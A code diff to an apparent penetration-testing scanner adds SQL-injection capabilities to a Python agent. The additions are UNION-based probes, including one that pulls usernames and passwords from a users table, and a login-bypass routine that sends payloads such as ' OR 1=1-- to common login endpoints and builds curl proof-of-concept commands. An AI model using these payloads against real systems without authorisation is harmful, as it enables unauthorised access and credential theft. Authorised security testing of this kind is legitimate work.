@@ -47,6 +47,12 @@ SQLI_PROBES = [
     {"payload": "1' AND ExtractValue(1, CONCAT(0x5c, 'penflow_sqli'))--", "marker": "penflow_sqli", "type": "error_based", "desc": "ExtractValue XML Error Injection"},
     {"payload": "1' AND 1=CONVERT(int, (SELECT 'penflow_sqli'))--", "marker": "penflow_sqli", "type": "error_based", "desc": "MSSQL Convert Error Injection"},
 
+    # UNION-based data extraction & column reflection
+    {"payload": "' UNION SELECT 'penflow_union_mark', NULL--", "marker": "penflow_union_mark", "type": "union_based", "desc": "UNION Query Column 1 String Injection"},
+    {"payload": "' UNION SELECT NULL, 'penflow_union_mark'--", "marker": "penflow_union_mark", "type": "union_based", "desc": "UNION Query Column 2 String Injection"},
+    {"payload": "' UNION SELECT NULL, NULL, 'penflow_union_mark'--", "marker": "penflow_union_mark", "type": "union_based", "desc": "UNION Query Column 3 String Injection"},
+    {"payload": "' UNION SELECT username, password FROM users--", "marker": "administrator", "type": "union_data_extraction", "desc": "UNION Users Table Record Extraction"},
+
     # Time-based blind — 2s sleep (reduced from 3s to stay within timeout budget)
     {"payload": "1' AND (SELECT 1 FROM (SELECT(SLEEP(2)))a)--", "sleep": 2, "type": "time_based_mysql", "desc": "MySQL Time-Based Sleep"},
     {"payload": "1'; SELECT pg_sleep(2);--", "sleep": 2, "type": "time_based_postgres", "desc": "PostgreSQL Time-Based Sleep"},
@@ -57,7 +63,7 @@ SQLI_PROBES = [
 
 class SQLiCapabilityAgent(BaseCapabilityAgent):
     """
-    Dedicated Capability Agent for SQL Injection across Error-based, Time-based, and Boolean-based vectors.
+    Dedicated Capability Agent for SQL Injection across Error-based, Time-based, UNION-based, and Auth-bypass vectors.
     """
     def __init__(self, priority: int = 10):
         super().__init__(agent_name="SQLiCapabilityAgent", priority=priority)
@@ -68,7 +74,7 @@ class SQLiCapabilityAgent(BaseCapabilityAgent):
             Capability(
                 id="sqli_vulnerability",
                 name="SQL Injection (SQLi)",
-                description="Detects error-based, time-based, and union SQL injection vulnerabilities across URL parameters and Cookies",
+                description="Detects error-based, time-based, UNION-based, and auth-bypass SQL injection vulnerabilities across URL parameters, Forms, and Cookies",
                 priority=self.priority,
                 tags=["sqli", "injection", "database"]
             )
@@ -78,12 +84,21 @@ class SQLiCapabilityAgent(BaseCapabilityAgent):
         logger.info(f"[{self.name}] Executing capability '{capability_id}' on asset '{context.asset}'...")
         http_client = context.get_http_client()
 
-        candidate_targets = self._collect_candidate_targets(context)
         findings: List[Dict[str, Any]] = []
         evidence: Dict[str, Any] = {}
 
-        # Budget: 4 targets × probes
+        # Step 1: Test Login Authentication Bypass on /login, /signin endpoints
+        login_finding = await self._test_login_auth_bypass(http_client, context)
+        if login_finding:
+            findings.append(login_finding)
+            evidence["sqli_confirmed"] = True
+
+        candidate_targets = self._collect_candidate_targets(context)
+
+        # Budget: 5 targets × probes
         for target in candidate_targets[:5]:
+            if findings:
+                break
             base_url = target["url"]
             param = target.get("param")
             cookie_name = target.get("cookie")
@@ -170,6 +185,41 @@ class SQLiCapabilityAgent(BaseCapabilityAgent):
                                 })
                                 evidence["sqli_confirmed"] = True
                                 break
+                    elif p_type.startswith("union_"):
+                        if cookie_name:
+                            continue
+                        exch_union = await http_client.send_as_identity(
+                            identity_id="anonymous_guest",
+                            method="GET",
+                            url=test_url
+                        )
+                        resp_u = exch_union.response
+                        if not resp_u or resp_u.status_code != 200:
+                            continue
+
+                        u_text = (resp_u.body_text or "").lower()
+                        marker = probe.get("marker", "").lower()
+
+                        if marker and (marker in u_text) and (marker not in base_text):
+                            curl_cmd = f"curl -i -s -k '{test_url}'"
+                            exch_dict = exch_union.to_dict()
+                            findings.append({
+                                "vulnerability_type": "sqli_vulnerability",
+                                "subtype": p_type,
+                                "target_url": test_url,
+                                "parameter": param,
+                                "payload": payload,
+                                "severity": "CRITICAL",
+                                "confidence": 0.99,
+                                "is_vulnerable": True,
+                                "exploit_curl": curl_cmd,
+                                "reproduction_steps": self.poc_generator.generate_reproduction_steps("UNION-Based SQL Injection", test_url, curl_cmd),
+                                "description": f"UNION-Based SQL Injection confirmed on '{base_url}' via parameter '{param}'. Injected query records disclosed in response table: '{marker}'.",
+                                "_exchange_obj": exch_dict,
+                                "evidence_exchanges": [exch_base.to_dict(), exch_union.to_dict()]
+                            })
+                            evidence["sqli_confirmed"] = True
+                            break
                     else:
                         if cookie_name:
                             continue  # Run error probes primarily on query params
@@ -242,6 +292,73 @@ class SQLiCapabilityAgent(BaseCapabilityAgent):
                 "evidence_exchanges": primary_finding.get("evidence_exchanges", [])
             }
         ).to_dict()
+
+    async def _test_login_auth_bypass(self, http_client: Any, context: CapabilityExecutionContext) -> Optional[Dict[str, Any]]:
+        """Tests login forms (/login, /admin/login) for classic SQL injection authentication bypass."""
+        import re
+        import urllib.parse
+        base = f"https://{context.asset}"
+        login_urls = [f"{base}/login", f"{base}/admin/login", f"{base}/signin", f"{base}/auth/login"]
+
+        for u in login_urls:
+            try:
+                get_resp = await http_client.send_as_identity(identity_id="anonymous_guest", method="GET", url=u)
+                if not get_resp or not get_resp.response:
+                    continue
+                body = (get_resp.response.body_text or "").lower()
+                if "password" not in body or ("username" not in body and "email" not in body and "user" not in body):
+                    continue
+
+                csrf_m = re.search(r'name=["\'](?:csrf|_csrf|csrf_token|authenticity_token)["\']\s+value=["\']([^"\']+)["\']', get_resp.response.body_text or "", re.I)
+                csrf_token = csrf_m.group(1) if csrf_m else ""
+
+                bypass_payloads = ["administrator'--", "' OR 1=1--", "admin' /*", "admin' or '1'='1"]
+                for p in bypass_payloads:
+                    post_data = {"username": p, "password": "PenFlowAuditPassword123!"}
+                    if csrf_token:
+                        post_data["csrf"] = csrf_token
+
+                    post_exch = await http_client.send_as_identity(
+                        identity_id="anonymous_guest",
+                        method="POST",
+                        url=u,
+                        headers={"Content-Type": "application/x-www-form-urlencoded"},
+                        body=urllib.parse.urlencode(post_data)
+                    )
+                    post_resp = post_exch.response if post_exch else None
+                    if not post_resp:
+                        continue
+
+                    loc = str(post_resp.headers.get("location", "") if post_resp.headers else "").lower()
+                    p_body = (post_resp.body_text or "").lower()
+
+                    is_redirect_auth = post_resp.status_code in (301, 302, 303, 307, 308) and any(
+                        acc in loc for acc in ["/my-account", "/account", "/admin", "/dashboard"]
+                    )
+                    is_body_auth = any(auth_sig in p_body for auth_sig in [
+                        "your username is: administrator", "welcome, admin", "log out", "logout", "admin panel"
+                    ])
+
+                    if is_redirect_auth or is_body_auth:
+                        curl_cmd = f"curl -i -s -k -X POST -d 'username={urllib.parse.quote(p)}&password=password' '{u}'"
+                        return {
+                            "vulnerability_type": "sqli_vulnerability",
+                            "subtype": "auth_bypass",
+                            "target_url": u,
+                            "parameter": "username",
+                            "payload": p,
+                            "severity": "CRITICAL",
+                            "confidence": 0.99,
+                            "is_vulnerable": True,
+                            "exploit_curl": curl_cmd,
+                            "reproduction_steps": self.poc_generator.generate_reproduction_steps("SQL Injection Login Bypass", u, curl_cmd),
+                            "description": f"CRITICAL SQL Injection Login Bypass confirmed on '{u}'. Authenticated administrative access gained using payload '{p}'.",
+                            "_exchange_obj": post_exch.to_dict(),
+                            "evidence_exchanges": [get_resp.to_dict(), post_exch.to_dict()]
+                        }
+            except Exception as e:
+                logger.debug(f"[SQLiCapabilityAgent] Login auth bypass test error on {u}: {e}")
+        return None
 
     def _collect_candidate_targets(self, context: CapabilityExecutionContext) -> List[Dict[str, str]]:
         targets: List[Dict[str, str]] = []
